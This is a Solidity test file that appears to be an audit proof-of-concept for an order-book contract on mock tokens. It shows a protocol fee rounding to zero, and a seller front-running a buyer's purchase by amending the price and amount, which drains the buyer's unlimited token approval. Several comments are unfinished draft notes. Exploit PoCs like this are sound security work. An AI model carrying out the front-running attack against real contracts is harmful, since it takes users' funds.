// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {OrderBook} from "../src/OrderBook.sol";
import {MockUSDC} from "./mocks/MockUSDC.sol";
import {MockWBTC} from "./mocks/MockWBTC.sol";
import {MockWETH} from "./mocks/MockWETH.sol";
import {MockWSOL} from "./mocks/MockWSOL.sol";

contract DuoLaSafePoC is Test {
    OrderBook book;
    MockUSDC usdc;
    MockWBTC wbtc;
    MockWETH weth;
    MockWSOL wsol;

    address owner = makeAddr("owner");
    address alice = makeAddr("alice_seller");
    address bob = makeAddr("bob_buyer");

    function setUp() public {
        usdc = new MockUSDC(6);
        wbtc = new MockWBTC(8);
        weth = new MockWETH(18);
        wsol = new MockWSOL(18);

        vm.prank(owner);
        book = new OrderBook(address(weth), address(wbtc), address(wsol), address(usdc), owner);

        wbtc.mint(alice, 10);       // 10 wBTC
        usdc.mint(bob, 1_000_000);  // 1,000,000 USDC
    }

    // ---------------------------------------------------------------
    // FINDING 1 (HIGH): withdrawFees double-counts / over-withdraws the
    // contract's USDC balance, bricking sellers' settled funds? -- verify
    // Actually verify: protocol fee accounting vs real USDC balance.
    // ---------------------------------------------------------------

    // ---------------------------------------------------------------
    // FINDING 1 (HIGH): Order can be filled AFTER the seller's token is
    // de-allowlisted by the owner; but more importantly create only checks
    // allowlist. The REAL bug: an order created for a token that is later
    // removed from the allowlist is fine. Test the genuine theft path below.
    // ---------------------------------------------------------------

    // ---------------------------------------------------------------
    // FINDING A (HIGH): No partial protection -- buyOrder pays fixed price.
    // The genuine HIGH: precision-loss fee rounding to ZERO lets a buyer
    // acquire an entire order paying NO protocol fee, and seller still gets
    // full price, but for tiny prices fee is 0. Demonstrate fee == 0.
    // ---------------------------------------------------------------
    function test_FeeRoundsToZero() public {
        // Alice lists 1 wBTC for a tiny USDC price (e.g. 33 base units = $0.000033)
        vm.startPrank(alice);
        wbtc.approve(address(book), 1e8);
        uint256 id = book.createSellOrder(address(wbtc), 1e8, 33, 1 days);
        vm.stopPrank();

        uint256 fee = (33 * book.FEE()) / book.PRECISION(); // (33*3)/100 = 0
        assertEq(fee, 0, "fee should round to zero");

        vm.startPrank(bob);
        usdc.approve(address(book), type(uint256).max);
        book.buyOrder(id);
        vm.stopPrank();

        // Protocol earned nothing
        assertEq(book.totalFees(), 0, "protocol got 0 fee");
        // Buyer got the wBTC
        assertEq(wbtc.balanceOf(bob), 1e8);
    }

    // ---------------------------------------------------------------
    // FINDING B (HIGH): Anyone can buy with an order whose token was
    // removed from allowlist AFTER creation -- confirm cancel/buy still ok
    // (this would be a NON-bug; we test to EXCLUDE it).
    // ---------------------------------------------------------------
    function test_DeallowlistDoesNotLockSeller() public {
        vm.startPrank(alice);
        wbtc.approve(address(book), 1e8);
        uint256 id = book.createSellOrder(address(wbtc), 1e8, 1000e6, 1 days);
        vm.stopPrank();

        // Owner removes wBTC from allowlist
        vm.prank(owner);
        book.setAllowedSellToken(address(wbtc), false);

        // Seller can STILL cancel and recover -> no lock. This EXCLUDES the bug.
        vm.prank(alice);
        book.cancelSellOrder(id);
        assertEq(wbtc.balanceOf(alice), 10e8);
    }

    // ---------------------------------------------------------------
    // FINDING 2 (HIGH): No slippage / front-running protection in buyOrder.
    // A malicious seller front-runs the buyer's buyOrder tx with
    // amendSellOrder, RAISING the price and/or SHRINKING the amount.
    // buyOrder has no maxPrice/minAmount param, so the buyer's approval
    // (typically max) is drained at the new worse terms.
    // ---------------------------------------------------------------
    function test_FrontRunAmendDrainsBuyer() public {
        // Alice lists 1 wBTC for 1000 USDC
        vm.startPrank(alice);
        wbtc.approve(address(book), 1e8);
        uint256 id = book.createSellOrder(address(wbtc), 1e8, 1000e6, 1 days);
        vm.stopPrank();

        // Bob approves (common pattern: infinite / generous approval)
        vm.prank(bob);
        usdc.approve(address(book), type(uint256).max);

        // --- Front-run: Alice sees Bob's pending buyOrder and amends ---
        // She raises price to 900,000 USDC AND shrinks amount to 1 satoshi.
        vm.prank(alice);
        book.amendSellOrder(id, 1, 900_000e6, 1 days);

        uint256 bobBefore = usdc.balanceOf(bob);

        // Bob's buyOrder executes against the WORSE terms with no revert.
        vm.prank(bob);
        book.buyOrder(id);

        uint256 bobPaid = bobBefore - usdc.balanceOf(bob);
        // Bob paid ~900k USDC and received only 1 satoshi of wBTC.
        assertEq(bobPaid, 900_000e6, "buyer drained at amended price");
        assertEq(wbtc.balanceOf(bob), 1, "buyer got only 1 satoshi");
        // Alice walks away with 99,999 wBTC-cents worth still locked? No:
        // she withdrew 1e8-1 via amend back to herself already.
        assertEq(wbtc.balanceOf(alice), 10e8 - 1, "seller recovered all but dust");
    }

    // ---------------------------------------------------------------
    // FINDING C (HIGH): Fee accounting vs balance. Verify withdrawFees
    // never exceeds real fee USDC held. (exclusion test)
    // ---------------------------------------------------------------
    function test_FeeAccountingConsistent() public {
        vm.startPrank(alice);
        wbtc.approve(address(book), 1e8);
        uint256 id = book.createSellOrder(address(wbtc), 1e8, 1000e6, 1 days);
        vm.stopPrank();

        vm.startPrank(bob);
        usdc.approve(address(book), type(uint256).max);
        book.buyOrder(id);
        vm.stopPrank();

        uint256 fee = (1000e6 * 3) / 100; // 30 USDC
        assertEq(book.totalFees(), fee);
        assertEq(usdc.balanceOf(address(book)), fee, "contract holds exactly the fee");

        vm.prank(owner);
        book.withdrawFees(owner);
        assertEq(usdc.balanceOf(owner), fee);
        assertEq(usdc.balanceOf(address(book)), 0);
    }
}
